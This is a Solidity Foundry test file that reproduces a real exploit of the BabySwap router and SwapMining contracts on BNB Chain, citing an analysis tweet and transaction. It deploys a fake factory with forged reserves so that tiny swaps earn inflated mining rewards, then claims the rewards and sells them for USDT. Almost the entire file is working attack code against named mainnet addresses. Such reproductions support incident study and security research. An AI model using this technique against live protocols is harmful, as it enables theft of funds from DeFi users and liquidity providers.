// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1576441612812836865
// @TX
// https://bscscan.com/tx/0xcca7ea9d48e00e7e32e5d005b57ec3cac28bc3ad0181e4ca208832e62aa52efe
interface BabySwapRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address[] memory factories,
        uint256[] memory fees,
        address to,
        uint256 deadline
    ) external;
}

interface SwapMining {
    function takerWithdraw() external;
}

contract FakeFactory {
    address Owner;
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    constructor() {
        Owner = msg.sender;
    }
    // fake pair

    function getPair(address token1, address token2) external view returns (address pair) {
        pair = address(this);
    }
    // fake pair

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {
        reserve0 = 10_000_000_000 * 1e18;
        reserve1 = 1;
        blockTimestampLast = 0;
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
        if (WBNB.balanceOf(address(this)) > 0) WBNB.transfer(Owner, WBNB.balanceOf(address(this)));
        // if(USDT.balanceOf(address(this)) > 0) USDT.transfer(Owner, USDT.balanceOf(address(this)));
    }
}

contract ContractTest is DSTest {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BABY = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    BabySwapRouter Router = BabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
    SwapMining swapMining = SwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21_811_979);
    }

    function testExploit() public {
        address(WBNB).call{value: 20_000}("");
        WBNB.approve(address(Router), type(uint256).max);
        BABY.approve(address(Router), type(uint256).max);
        // create fakefactory
        FakeFactory factory = new FakeFactory();
        // swap token to claim reward
        address[] memory path1 = new address[](2);
        path1[0] = address(WBNB);
        path1[1] = address(USDT);
        address[] memory factories = new address[](1);
        factories[0] = address(factory);
        uint256[] memory fees = new uint[](1);
        fees[0] = 0;
        Router.swapExactTokensForTokens(10_000, 0, path1, factories, fees, address(this), block.timestamp);
        // swap token to claim reward
        address[] memory path2 = new address[](2);
        path2[0] = address(WBNB);
        path2[1] = address(BABY);
        Router.swapExactTokensForTokens(10_000, 0, path2, factories, fees, address(this), block.timestamp);
        // calim reward token
        swapMining.takerWithdraw();
        sellBaby();

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function sellBaby() internal {
        address[] memory path = new address[](2);
        path[0] = address(BABY);
        path[1] = address(USDT);
        address[] memory factories = new address[](1);
        factories[0] = address(0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da);
        uint256[] memory fees = new uint[](1);
        fees[0] = 3000;
        Router.swapExactTokensForTokens(
            BABY.balanceOf(address(this)), 0, path, factories, fees, address(this), block.timestamp
        );
    }
}
